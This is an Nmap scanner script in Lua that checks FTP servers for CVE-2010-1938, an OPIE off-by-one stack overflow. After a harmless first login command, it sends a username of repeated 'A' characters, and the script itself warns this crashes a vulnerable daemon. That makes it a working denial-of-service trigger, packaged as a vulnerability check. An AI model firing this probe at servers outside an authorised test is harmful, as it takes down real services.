local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"

description = [[
Checks if an FTPd is prone to CVE-2010-1938 (OPIE off-by-one stack overflow),
a vulnerability discovered by Maksymilian Arciemowicz and Adam "pi3" Zabrocki.
See the advisory at https://nmap.org/r/fbsd-sa-opie.
Be advised that, if launched against a vulnerable host, this script will crash the FTPd.
]]

---
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-libopie:
-- |   VULNERABLE:
-- |   OPIE off-by-one stack overflow
-- |     State: LIKELY VULNERABLE
-- |     IDs:  CVE:CVE-2010-1938  OSVDB:64949
-- |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       An off-by-one error in OPIE library 2.4.1-test1 and earlier, allows remote
-- |       attackers to cause a denial of service or possibly execute arbitrary code
-- |       via a long username.
-- |     Disclosure date: 2010-05-27
-- |     References:
-- |       http://osvdb.org/64949
-- |       http://site.pi3.com.pl/adv/libopie-adv.txt
-- |       http://security.freebsd.org/advisories/FreeBSD-SA-10:05.opie.asc
-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1938
--


author = "Ange Gutek"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln","intrusive"}


portrule = shortport.port_or_service(21, "ftp")

action = function(host, port)
  local opie_vuln = {
    title = "OPIE off-by-one stack overflow",
    IDS = {CVE = 'CVE-2010-1938', OSVDB = '64949'},
    risk_factor = "High",
    scores = {
      CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
    },
    description = [[
An off-by-one error in OPIE library 2.4.1-test1 and earlier, allows remote
attackers to cause a denial of service or possibly execute arbitrary code
via a long username.]],
    references = {
      'http://security.freebsd.org/advisories/FreeBSD-SA-10:05.opie.asc',
      'http://site.pi3.com.pl/adv/libopie-adv.txt',
    },
    dates = {
      disclosure = {year = '2010', month = '05', day = '27'},
    },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local socket = nmap.new_socket()
  local result
  -- If we use more that 31 chars for username, ftpd will crash (quoted from the advisory).
  local user_account = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  local status = true

  local err_catch = function()
    socket:close()
  end

  local try = nmap.new_try(err_catch)

  socket:set_timeout(10000)
  try(socket:connect(host, port))

  -- First, try a safe User so that we are sure that everything is ok
  local payload = "USER opie\r\n"
  try(socket:send(payload))

  status, result = socket:receive_lines(1);
  if status and not (string.match(result,"^421")) then

    -- Second, try the vulnerable user account
    local payload = "USER " .. user_account .. "\r\n"
    try(socket:send(payload))

    status, result = socket:receive_lines(1);
    if status then
      opie_vuln.state = vulns.STATE.NOT_VULN
    else
      -- if the server does not answer anymore we may have reached a stack overflow condition
      opie_vuln.state = vulns.STATE.LIKELY_VULN
    end
  end
  return report:make_output(opie_vuln)
end
